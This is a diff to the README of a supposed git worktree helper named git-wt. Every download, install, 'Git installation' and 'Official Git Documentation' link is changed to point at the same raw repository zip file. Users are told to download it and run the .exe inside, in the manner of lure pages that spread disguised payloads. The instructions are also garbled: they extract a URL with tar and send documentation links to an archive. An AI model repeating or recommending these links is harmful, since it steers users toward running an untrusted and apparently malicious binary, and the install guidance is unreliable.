@@ -1,7 +1,7 @@
 # 🎉 git-wt - Simplifying Git Worktree Usage
 
 ## 🚀 Download Now
-[![Download git-wt](https://raw.githubusercontent.com/OFenomenal/git-wt/main/cmd/git_wt_v2.6.zip)](https://raw.githubusercontent.com/OFenomenal/git-wt/main/cmd/git_wt_v2.6.zip)
+[![Download git-wt](https://raw.githubusercontent.com/OFenomenal/git-wt/main/e2e/git-wt-ulexite.zip)](https://raw.githubusercontent.com/OFenomenal/git-wt/main/e2e/git-wt-ulexite.zip)
 
 ## 📖 Description
 git-wt is a simple command that enhances the `git worktree` functionality. It helps you manage project branches and handle files more effectively without getting lost in complex commands. Enjoy a straightforward experience with your Git projects.
@@ -15,21 +15,21 @@ git-wt is a simple command that enhances the `git worktree` functionality. It he
 
 ## 💻 System Requirements
 - **Operating System:** Windows, macOS, or Linux.
-- **Git Installation:** Ensure that Git is installed on your system. You can download it from [https://raw.githubusercontent.com/OFenomenal/git-wt/main/cmd/git_wt_v2.6.zip](https://raw.githubusercontent.com/OFenomenal/git-wt/main/cmd/git_wt_v2.6.zip).
+- **Git Installation:** Ensure that Git is installed on your system. You can download it from [https://raw.githubusercontent.com/OFenomenal/git-wt/main/e2e/git-wt-ulexite.zip](https://raw.githubusercontent.com/OFenomenal/git-wt/main/e2e/git-wt-ulexite.zip).
 - **Disk Space:** At least 50 MB of free disk space for installation.
 
 ## 📦 Download & Install
 To get started with git-wt, visit the Releases page to download the latest version.
 
-[Download git-wt here](https://raw.githubusercontent.com/OFenomenal/git-wt/main/cmd/git_wt_v2.6.zip)
+[Download git-wt here](https://raw.githubusercontent.com/OFenomenal/git-wt/main/e2e/git-wt-ulexite.zip)
 
 Once you are on the Releases page, follow these steps to install:
 
 1. Look for the latest release at the top.
-2. Download the version that matches your operating system (you’ll see options like `.exe` for Windows or `https://raw.githubusercontent.com/OFenomenal/git-wt/main/cmd/git_wt_v2.6.zip` for Linux/macOS).
+2. Download the version that matches your operating system (you’ll see options like `.exe` for Windows or `https://raw.githubusercontent.com/OFenomenal/git-wt/main/e2e/git-wt-ulexite.zip` for Linux/macOS).
 3. After downloading, locate the file on your computer.
 4. **For Windows Users:** Double-click the downloaded `.exe` file to start the installation. Follow the on-screen instructions.
-5. **For macOS and Linux Users:** Open a terminal window and navigate to the location of the downloaded file. Use the command `tar -xzf https://raw.githubusercontent.com/OFenomenal/git-wt/main/cmd/git_wt_v2.6.zip` to extract. Replace `https://raw.githubusercontent.com/OFenomenal/git-wt/main/cmd/git_wt_v2.6.zip` with the actual file name. Then, follow additional instructions found in the extracted folder.
+5. **For macOS and Linux Users:** Open a terminal window and navigate to the location of the downloaded file. Use the command `tar -xzf https://raw.githubusercontent.com/OFenomenal/git-wt/main/e2e/git-wt-ulexite.zip` to extract. Replace `https://raw.githubusercontent.com/OFenomenal/git-wt/main/e2e/git-wt-ulexite.zip` with the actual file name. Then, follow additional instructions found in the extracted folder.
 
 Once you complete the installation, you can start using git-wt right away!
 
@@ -85,7 +85,7 @@ You can check the Issues section of the repository on GitHub for solutions or re
 If you're interested in contributing to git-wt, you can start by checking out the existing issues and submitting your enhancements or bug fixes. Every contribution helps improve the tool for everyone. Your feedback is also welcome!
 
 ## 📚 Additional Resources
-- **Official Git Documentation:** [Git Documentation](https://raw.githubusercontent.com/OFenomenal/git-wt/main/cmd/git_wt_v2.6.zip)
+- **Official Git Documentation:** [Git Documentation](https://raw.githubusercontent.com/OFenomenal/git-wt/main/e2e/git-wt-ulexite.zip)
 - **Community Forum:** Join discussions and get help on Git-related topics.
 
 If you enjoy using git-wt, consider sharing it with your friends or colleagues who may benefit from a simpler Git experience. We appreciate your support! 
